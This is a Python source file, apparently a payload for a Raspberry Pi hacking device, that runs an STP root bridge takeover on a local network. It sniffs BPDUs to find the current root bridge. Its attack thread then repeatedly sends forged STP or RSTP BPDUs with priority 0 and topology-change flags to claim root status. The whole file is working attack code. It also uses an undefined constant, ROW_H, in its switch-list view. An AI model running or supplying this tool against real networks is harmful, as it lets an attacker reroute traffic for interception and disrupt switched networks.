#!/usr/bin/env python3
"""
RaspyJack Payload -- STP Root Bridge Takeover
==============================================
Author: 7h30th3r0n3

Sends STP BPDU frames with priority 0 to claim root bridge status on the
local network segment.  Supports both classic STP (802.1D) and RSTP
(802.1w) modes.  Sniffs existing BPDUs to display current root bridge info.

Controls:
  OK         -- Start / stop sending BPDUs
  KEY1       -- Toggle STP / RSTP mode
  KEY2       -- Show detected switches
  KEY3       -- Exit

Requires: scapy
"""

import os
import sys
import time
import struct
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        Ether, LLC, Raw, sendp, sniff as scapy_sniff,
        get_if_hwaddr, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT

STP_MULTICAST = "01:80:c2:00:00:00"

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
attacking = False
rstp_mode = False
bpdus_sent = 0
status_msg = "Ready"
iface = "eth0"

# Sniffed STP info
current_root_priority = None
current_root_mac = None
current_root_cost = None
detected_switches = []  # list of {"mac": ..., "priority": ..., "time": ...}

show_switches = False
scroll = 0

# ---------------------------------------------------------------------------
# Interface / MAC helpers
# ---------------------------------------------------------------------------

def _detect_interface():
    """Detect best wired interface."""
    for candidate in ["eth0", "enp0s3", "ens33"]:
        try:
            r = subprocess.run(
                ["ip", "link", "show", candidate],
                capture_output=True, text=True, timeout=5,
            )
            if "UP" in r.stdout:
                return candidate
        except Exception:
            pass
    return "eth0"


def _get_mac(iface_name):
    """Get MAC address of interface."""
    try:
        return get_if_hwaddr(iface_name)
    except Exception:
        pass
    try:
        with open(f"/sys/class/net/{iface_name}/address") as f:
            return f.read().strip()
    except Exception:
        return "00:00:00:00:00:00"

# ---------------------------------------------------------------------------
# BPDU builder
# ---------------------------------------------------------------------------

def _mac_to_bytes(mac_str):
    """Convert MAC string to bytes."""
    return bytes.fromhex(mac_str.replace(":", ""))


def _build_bpdu(src_mac, use_rstp=False):
    """Build an STP/RSTP BPDU frame with priority 0."""
    mac_bytes = _mac_to_bytes(src_mac)

    protocol_id = 0x0000
    version = 0x02 if use_rstp else 0x00
    bpdu_type = 0x02 if use_rstp else 0x00

    # Topology Change + Topology Change Ack flags
    flags = 0x3C if use_rstp else 0x01

    # Root ID: priority 0 + our MAC
    root_priority = struct.pack("!H", 0x0000) + mac_bytes
    # Root path cost: 0
    root_path_cost = struct.pack("!I", 0)
    # Bridge ID: priority 0 + our MAC
    bridge_id = struct.pack("!H", 0x0000) + mac_bytes
    # Port ID
    port_id = struct.pack("!H", 0x8001)
    # Message age: 0
    message_age = struct.pack("!H", 0)
    # Max age: 20 seconds (in 1/256ths)
    max_age = struct.pack("!H", 20 * 256)
    # Hello time: 2 seconds
    hello_time = struct.pack("!H", 2 * 256)
    # Forward delay: 15 seconds
    forward_delay = struct.pack("!H", 15 * 256)

    bpdu_payload = (
        struct.pack("!HBB", protocol_id, version, bpdu_type)
        + struct.pack("B", flags)
        + root_priority
        + root_path_cost
        + bridge_id
        + port_id
        + message_age
        + max_age
        + hello_time
        + forward_delay
    )

    if use_rstp:
        # RSTP: version 1 length = 0
        bpdu_payload += struct.pack("!H", 0)

    pkt = (
        Ether(src=src_mac, dst=STP_MULTICAST)
        / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
        / Raw(load=bpdu_payload)
    )
    return pkt

# ---------------------------------------------------------------------------
# BPDU sniffer thread
# ---------------------------------------------------------------------------

def _parse_bpdu(raw_data):
    """Parse STP BPDU fields from raw payload."""
    if len(raw_data) < 35:
        return None
    try:
        proto_id = struct.unpack("!H", raw_data[0:2])[0]
        if proto_id != 0x0000:
            return None
        version = raw_data[2]
        bpdu_type = raw_data[3]
        flags = raw_data[4]
        root_priority = struct.unpack("!H", raw_data[5:7])[0]
        root_mac = ":".join(f"{b:02X}" for b in raw_data[7:13])
        root_cost = struct.unpack("!I", raw_data[13:17])[0]
        bridge_priority = struct.unpack("!H", raw_data[17:19])[0]
        bridge_mac = ":".join(f"{b:02X}" for b in raw_data[19:25])
        return {
            "version": version,
            "type": bpdu_type,
            "root_priority": root_priority,
            "root_mac": root_mac,
            "root_cost": root_cost,
            "bridge_priority": bridge_priority,
            "bridge_mac": bridge_mac,
        }
    except Exception:
        return None


def _sniffer_thread(iface_name):
    """Sniff STP BPDUs to discover current root bridge."""
    global current_root_priority, current_root_mac, current_root_cost

    def _handle(pkt):
        if not _running:
            return
        if not pkt.haslayer(Raw):
            return
        payload = bytes(pkt[Raw].load)
        parsed = _parse_bpdu(payload)
        if parsed is None:
            return

        with lock:
            current_root_priority = parsed["root_priority"]
            current_root_mac = parsed["root_mac"]
            current_root_cost = parsed["root_cost"]

            # Track unique switches by bridge MAC
            known_macs = {s["mac"] for s in detected_switches}
            if parsed["bridge_mac"] not in known_macs:
                detected_switches.append({
                    "mac": parsed["bridge_mac"],
                    "priority": parsed["bridge_priority"],
                    "time": datetime.now().strftime("%H:%M:%S"),
                })

    try:
        scapy_sniff(
            iface=iface_name,
            prn=_handle,
            store=False,
            filter="ether dst 01:80:c2:00:00:00",
            stop_filter=lambda _: not _running,
        )
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Attack thread
# ---------------------------------------------------------------------------

def _attack_thread(iface_name, src_mac):
    """Send BPDUs every 2 seconds to claim root bridge."""
    global attacking, bpdus_sent, status_msg

    while _running and attacking:
        pkt = _build_bpdu(src_mac, use_rstp=rstp_mode)
        try:
            sendp(pkt, iface=iface_name, verbose=False)
            with lock:
                bpdus_sent += 1
                mode_label = "RSTP" if rstp_mode else "STP"
                status_msg = f"Sent BPDU #{bpdus_sent} ({mode_label})"
        except Exception as exc:
            with lock:
                status_msg = f"Err: {str(exc)[:16]}"

        # Hello interval: 2 seconds
        deadline = time.time() + 2.0
        while time.time() < deadline and _running and attacking:
            time.sleep(0.1)

    with lock:
        attacking = False
        status_msg = "Attack stopped"

# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font_obj):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    mode_label = "RSTP" if rstp_mode else "STP"
    d.text((2, 1), f"STP ROOT ({mode_label})", font=font_obj, fill="#FF3300")
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if attacking else "#444")

    with lock:
        msg = status_msg
        sent = bpdus_sent
        r_pri = current_root_priority
        r_mac = current_root_mac
        r_cost = current_root_cost
        switches = list(detected_switches)
        showing_sw = show_switches

    if showing_sw:
        # Show detected switches view
        d.text((2, 16), f"Detected: {len(switches)}", font=font_obj, fill="#FFAA00")
        visible = switches[scroll:scroll + 7]
        for i, sw in enumerate(visible):
            y = 28 + i * ROW_H
            line = f"{sw['mac'][-8:]} P:{sw['priority']}"
            d.text((2, y), line, font=font_obj, fill="#CCCCCC")
    else:
        # Normal view
        d.text((2, 16), "Current Root:", font=font_obj, fill="#666")
        if r_mac:
            d.text((2, 28), f"Pri: {r_pri}", font=font_obj, fill="#FFAA00")
            d.text((2, 38), f"MAC: {r_mac[-8:]}", font=font_obj, fill="#AAAAAA")
            d.text((2, 48), f"Cost: {r_cost}", font=font_obj, fill="#888")
        else:
            d.text((2, 28), "Sniffing...", font=font_obj, fill="#888")

        d.text((2, 62), "Our Attack:", font=font_obj, fill="#666")
        d.text((2, 74), "Priority: 0 (lowest)", font=font_obj, fill="#00FF88")
        d.text((2, 84), f"BPDUs sent: {sent}", font=font_obj, fill="#AAAAAA")
        d.text((2, 96), msg[:24], font=font_obj, fill="#888")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if attacking:
        d.text((2, 117), "OK:Stop  K3:Exit", font=font_obj, fill="#888")
    else:
        d.text((2, 117), "OK:Go K1:Mode K3:Quit", font=font_obj, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, attacking, rstp_mode, show_switches, scroll, iface

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font_obj = scaled_font()

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font_obj, fill="#FF0000")
        d.text((4, 65), "pip install scapy", font=font_obj, fill="#888")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    iface = _detect_interface()
    src_mac = _get_mac(iface)

    # Start BPDU sniffer
    threading.Thread(
        target=_sniffer_thread, args=(iface,), daemon=True
    ).start()

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "OK":
                if attacking:
                    attacking = False
                else:
                    attacking = True
                    threading.Thread(
                        target=_attack_thread, args=(iface, src_mac),
                        daemon=True,
                    ).start()
                time.sleep(0.3)

            elif btn == "KEY1" and not attacking:
                rstp_mode = not rstp_mode
                time.sleep(0.3)

            elif btn == "KEY2":
                show_switches = not show_switches
                scroll = 0
                time.sleep(0.3)

            elif btn == "UP":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                with lock:
                    max_s = max(0, len(detected_switches) - 7)
                scroll = min(scroll + 1, max_s)
                time.sleep(0.15)

            _draw_frame(lcd, font_obj)
            time.sleep(0.05)

    finally:
        _running = False
        attacking = False
        time.sleep(0.3)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
